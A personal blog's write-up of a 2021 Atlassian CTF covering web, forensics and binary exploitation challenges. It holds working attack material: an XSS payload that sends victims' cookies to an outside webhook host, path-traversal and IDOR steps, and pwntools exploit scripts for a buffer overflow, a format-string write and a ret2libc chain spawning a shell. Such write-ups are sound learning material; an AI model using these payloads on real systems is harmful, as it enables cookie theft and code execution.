---
title: 'Atlassian{CTF Writeup}'
categories: ['Hacking', 'CTF', 'Binary Exploitation', 'Web Hacking']
tags: ['hacking', 'CTF', 'Binary Exploitation', 'Web Hacking', 'Steganography']
date: '2021-10-22'
type: 'post'
weight: 400
keywords: 'hacking pentesting c source code auditing static analysis'
toc: 'true'
---

This was a really fun CTF with plenty of variety in terms of challenges. Lots of fun doable ones with plenty of learning opportunities as well as some more challenging ones. I managed to pull off a second place finish with the help of the smaller number of players (40 odd) and the generosity of the `pwn` challenge points.

![](https://i.imgur.com/ze1MLSZ.png)

**Idiot warning ⚠️**

> Please note that everything I write here and in these blogs is what I _think_ I know to be true. Don't accept everything I say as fact I am in fact a scrub 🖤

## Web

### 0x31 fly

1. looks like path traversal, the file is grabbed using a path param in the url
2. Try several payloads and common files including flag.txt
3. Realise that some are returning 404 and others are getting caught by the proxy
4. Realise `.` is detected
5. Try bypass with encoding including on the `.txt` extension
6. Profit

> `flag{lfi_i$_still_a_thing!}`

### 0x40 Captcha

In this challenge you have a web form which presents a simple captcha interface with a form to enter the characters shown in the image. If we enter the captcha correctly the count goes up but the required number of correct solves to get the flag is unknown. This means the challenge is intended as a scripting based one.

Initially I assumed the challenge would require OCR to extract the text from the image programmatically. However, when examining the source for the web page to find the img element in the DOM I noticed that the `class` name for the `img` element included the characters in the captcha.

This means we can just scrape the web page with a utility like beautiful soup and parse the HTML to extract the class name from the image element and send it back to the server.

The other thing we need to keep in mind is that the server needs a way to know which client (player) is entering captchas in order to track the progress and award the flag. This is done with a session token/cookie which is sent in responses from the server and needs to be included in requests we send back in order to track our captcha entering progress. The python `requests` lib supports this out of the box with a method `Session()` which automatically extracts cookies from server responses and sends them back in the request headers. Thus we construct a script like the one bellow to get the flag.

```python
from bs4 import BeautifulSoup
import requests

'''
Use bs4 and requests to solve some x
captcha's by extracting the capture
data leaked in the img class name.
'''


TARGET_URL = 'http://ctfo.2pmc.net:10022/'
sesh = requests.Session()


def main(count=0):

	print("[>>] Scraping target DOM")
	target_html = sesh.get(TARGET_URL).text

	soup = BeautifulSoup(target_html, "html.parser")
	dom_target = soup.find("img").get('class')
	print(f"[>>] extracted target {dom_target}")
	secret = dom_target[0]
	print(f"[>>] sending {secret}")
	# send back captcha
	res = sesh.post(
			TARGET_URL,
			data = {
				"secret": secret,
				"submit": "verify"
			}
	)

	print(f"[>>] res {res.text}")
	if (count == 70):
		return

	count += 1
	main(count)


if __name__ == '__main__':
	main()
```

> `flag{N0_n33d_f0r_0CR}`

### 0x44 Door

1. Go to a blog
2. Url has a sequential value to reference the blog IE `/blog/3`
3. The other blogs go up from `3` and the lowest one with a link is blog `2`
4. Navigate to `/1`

> `flag{1ns3cur3_0bj3c+_r3f3rnces_are_dank}`

### 0x45 Sésame, ouvre-toi

1. SQLI vuln
2. Post based
3. `"` syntax
4. SQLmap hard, csrf token impact?
5. Nope default creds

```
admin
password
```

> `flag{didnt_save_mybad}`

### 0x47 simplexss

A dead giveaway that a challenge is an XSS based one is if the web application suggests that some 'other person' will look at a page that you can control the contents of to some extent. This is because XSS happens in the browser when javascript makes its way into the DOM context, and is subsequently rendered (processed), which means someone else (or a bot) needs to look at the page you inject with your XSS payload in order to trigger it from their perspective.

In this case the page we control has a simple XSS filter on the word `script` so we can simply switch the case to caps since all HTML elements are case insensitive in order to evade the filter.

Since we cannot 'see' the clients web page we are attacking we need a way to capture their cookie and send it some place we can see. This is called an out of band approach. A great way to do this for XSS is with a webhook website like [pipedream](https://pipedream.net) or requestbin which gives you an ephemeral public url that you can place in your payload, which when triggered makes a request to the url with the targets cookie as a parameter.

A sample payload bellow:

```javascript
<SCRIPT>fetch(`https://<ur-subdomain>.m.pipedream.net?cookie=${encodeURIComponent(document.cookie)}`)</ScRiPt>
```

> `flag{S00_XSS_1snt_that_h@rd}`

### 0x50 door

1. Looks like xss because of the message that a bot will look at the page after submitting the form
2. Can get payload into DOM but no cookies to grab
3. Check robots.txt for an internal page to grab instead of the cookie, instead find the flag

> `flag{SW4nky_r0b0ts_txt_w0w_who_wouldve_guessed}`

## Forensics

### HTTP OK

This was a typical PCAP forensics challenge which required you to search body of packets in the supplied packet capture file. Initially before I even open wireshark for challenges like this I like to use an [online packet analyser](https://apackets.com/) which can often reveal information that would take a long time to dig through in wireshark. Such things include:

-   Images
-   Other file types
-   HTTP request bodies and headers
-   Ethernet connections

In this case I was not able to find any flags or items of interest in the analysis.

_Bonus Tip: if the capture is too large to upload to the site you can split it into two with the command line and upload both parts_

Thus I turned to wireshark to analyse the capture. Probably the first step here should always be to do the equivalent of 'grepping' the capture for the flag syntax using the search string function.

![](https://i.imgur.com/3KKdqoJ.png)

Take care to try all three options in the far left dropdown, pictured 'Packet bytes'. This turns up the flag in the packet bytes of one such HTTP request.

![](https://i.imgur.com/cWGERsu.png)

```
<snip>

0300   1b 88 0e 5f c6 d1 a1 f1 cf c8 d5 8f 35 30 08 07   ..._........50..
0310   1d b2 7c 8a e6 71 b2 7c 7c 3c c5 57 fa 05 19 12   ..|..q.||<.W....
0320   9f f8 94 06 79 e8 0f 3c 87 a5 69 e0 84 ae 43 72   ....y..<..i...Cr
0330   8f 8e 68 96 bb 08 4e d3 8e d0 5b 5a 12 f1 81 66   ..h...N...[Z...f
0340   53 be dd 40 23 b3 ab 7e 42 1b 4f 7f 41 5f b6 60   S..@#..~B.O.A_.`
0350   0a cf 93 15 f6 b1 16 fe cf 1e e2 d1 38 b4 df eb   ............8...
0360   0d 82 3d a7 aa 88 90 ee 30 82 82 f1 4d a1 4b 07   ..=.....0...M.K.
0370   da 26 a5 36 e6 25 cf 3e 34 2c 59 1f 41 5a 49 ca   .&.6.%.>4,Y.AZI.
0380   64 74 72 6f 6a 61 6e 5f 66 6c 61 67 7b 73 74 72   dtrojan_flag{str
0390   69 6e 67 73 5f 61 72 65 5f 6d 79 5f 66 72 69 65   ings_are_my_frie
03a0   6e 64 7d                                          nd}

```

> `trojan_flag{strings_are_my_friend}`

## pwn

### pwnd

1. Use [pwntools](https://docs.pwntools.com/en/stable/) to send the raw `0x7` byte

```python
## get da banner
log.info('Receiving banner ...')
proc.recvuntil('printFlag ')
print_flag_addr = proc.recvuntil('\n')

passwd = b'supe\x07r_s3cret'
proc.sendlineafter('Enter the password: ', passwd)


# shellit
proc.interactive()
```

### jump

This challenge was a standard ret2win type buffer overflow challenge. We start by observing that the binary leaks the memory address of `printFlag` and also that the function is not called anywhere in the program. In such cases the goal is to call that function ourself, typically by exploiting a buffer overflow.

There are a few ways to determine if the binary is vulnerable to a buffer overflow but my personal favourite is to run the binary with `gdb` and then use `cyclic` to generate a big patterned input we can then use to calculate the offset to the return pointer. In this case we produced a crash with `cyclic 100` and the offset was around `cyclic_find(b'agaa') - 5`. We can then chain this with the leaked address of `printFlag` to swap out the return pointer with its address causing the binary to jump there when it returns.

This worked fine locally but failed against the remote server so I fuzzed the offset until the payload popped on `cyclic_find(b'agaa') - 1`.

_If you want to read more about basic overflows I also wrote this guide, [Basic Stack Based Overflows](https://cybernetic.coffee/blog/basic-stack-based-overflows/)_

```python
HOST = 'ctfo.2pmc.net:10003'
""" hack the program """
binary = f'./{PATH}/{BINARY}'
proc = process(binary)
rop = ROP(binary)
elf = ELF(binary, False)


## get da banner
log.info('Receiving banner ...')
proc.recvuntil('printFlag ')
print_flag_addr = int(proc.recvuntil('.', drop=True), 16)

log.success(f'printFlag leak: {hex(print_flag_addr)}')

# Worked locally
# offset = cyclic_find(b'agaa') - 5

# offset for remote
offset = cyclic_find(b'agaa') - 1
log.info(f'Offset: {offset}')

payload = flat({
    offset: p64(print_flag_addr)
})

proc.sendlineafter(b'name: ', payload)


# shellit
proc.interactive()

```

> `flag{sup3rrrrrr_s1mple_pwn}`

### printf

This was a pleasantly straightforward format string based binary which included the source code of the program. The only real prerequisite was knowing that you can use `%n` (and its variants) in the presence of a format string vuln to write to memory. Taking a look at the source code our main function of interest is:

```c

void authenticate()
{
    // find this buf
    char buf[200];
    char isAllowed = 0;

    printf("%p\n", &isAllowed);

    fflush(stdout);

    fgets(buf, 200, stdin);

    printf(buf);
    fflush(stdout);

    // todo -> flip this
    if (isAllowed)
    {
        printFlag();
    }
}
```

Which makes it clear our goal is to modify `isAllowed` to a non-zero value such that the check will pass and leak the flag. As mentioned our format string vulnerability, which is introduced just before the if case `printf(buf)`, can be exploited with `%n` to alter the memory at `isAllowed`.

Of note is that the binary also leaks the memory address of `isAllowed` which we can see in the source code just bellow the variable decelerations.

For format string challenges I use a little utility lib that I made myself, you can find it [here](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/FormatStrings/FormatStrings.md#automated-format-sting-payloads). Alternatively pwntools has one built in.

```python

# fmt
from formatstrings.fmt_string import build


# ::::::::::::::::::::::::: CONFIG :::::::::::::::::::::::::
PATH = 'Chals'
BINARY = 'printf'
HOST = 'ctfo.2pmc.net:10004'

## get da banner
log.info('Receiving banner ...')
isAllowed_addr = int(proc.recvuntil('\n', drop=True), 16)
log.success(f'isAllowed_addr: {hex(isAllowed_addr)}')

payload = build(isAllowed_addr, 0x42, 6)
proc.sendline(payload)

# shellit
proc.interactive()
```

> `flag{forgot_to_save}`

### baby rop

This challenge was a pretty fun `ret2libc` variant of [ROP](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/ROP/ROP.md#return-oriented-programming-rop) with the libc version used on the host included. In such ROP challenges there are three main goals:

1. Calculate the offset for an overflow
2. Rebase libc with a leak
3. Call system with a reference to `/bin/sh` using `libc`

If you haven't seen a ROP challenge before this will be a difficult place to start so do checkout some other resources. However for a quick overview of `ret2libc` we basically obtain or are given the version and sometimes binary of a dynamically linked standard `C` library that contains a ton of functions used in writing most `C` programs. Examples include: `printf`, `puts`, `strncmp` and `system`. There are also other strings floating around in there that we can take advantage of such as `/bin/sh` which `system` needs as an argument in order to obtain a shell for us.

Thus with this in mind we run the binary and see that it leaks two address values. The first is some random address `lol` that refers to very little in memory. The second however `system plez` is the address of the `system` function in the **binary** (not libc). We can collect this leak for usage in rebasing the binary.

With that in hand we can use the difference between the leaked system address and the one in `libc` to calculate the base address of `libc` using the handy pwntools syntax:

`libc.address = system_addr - libc.symbols['system']`

This will now allow us to interact with arbitrary `libc` functions and grab helpful strings using pwntool' search method. Thus we proceed marking `libc` as a input for the `ROP` method and then exploiting one of the most powerful oneliners in pwntools:

`rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])`

Which will construct all the necessary bits and pieces to call `system("/bin/sh")` for us once we take over the return pointer. Thus in similar fashion to other buffer overflow challenges we use the `flat()` method in combination with `rop.chain()` to insert our constructed chain at the return. Running this against remote works great and we take home a `400 pt` flag!

```python
PATH = 'Chals'
BINARY = 'babyrop'
HOST = 'ctfo.2pmc.net:7888'

LIBC_REMOTE = f'{PATH}/libc/libc-2.28.so'
LIBC_LOCAL = '/lib/x86_64-linux-gnu/libc.so.6'

# ::::::::::::::::::::::: CHECK SEC ::::::::::::::::::::::::

'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''

# ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

context.arch = 'amd64'
def pwn(args):
    """ hack the program """
    binary = f'./{PATH}/{BINARY}'
    proc = process(binary)
    rop = ROP(binary)
    elf = ELF(binary, False)
    libc = ELF(LIBC_LOCAL, checksec=False)

    if (args.remote):
        host = HOST.split(':')
        proc = remote(host[0], int(host[1]))
        try: libc = ELF(LIBC_REMOTE, checksec=False)
        except: libc = None


    ## get da banner
    log.info('Receiving banner ...')
    pause()
    # proc.recvuntil('> ')
    banner = proc.recvuntil(b'lol: ')
    lol_addr = proc.recvuntil(b'\n', drop=True)
    log.info(f'lol was {lol_addr}')
    proc.recvuntil(b'system leak plz: ')
    system_addr = int(proc.recvuntil(b'\n', drop=True), 16)
    log.success(f'System addr: {hex(system_addr)}')

    # offset for overflow
    offset = cyclic_find(b'kaaa')
    log.info(f'Offset: {offset}')

    # rebase libc using leak
    libc.address = system_addr - libc.symbols['system']
    rop = ROP(libc)
    rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

    # construct payload
    payload = flat({
        offset: rop.chain()
    })

    proc.sendlineafter(b'> ', payload)

    # shellit
    proc.interactive()

```

> `flag{s0_y0u_c@n_r0p??}`
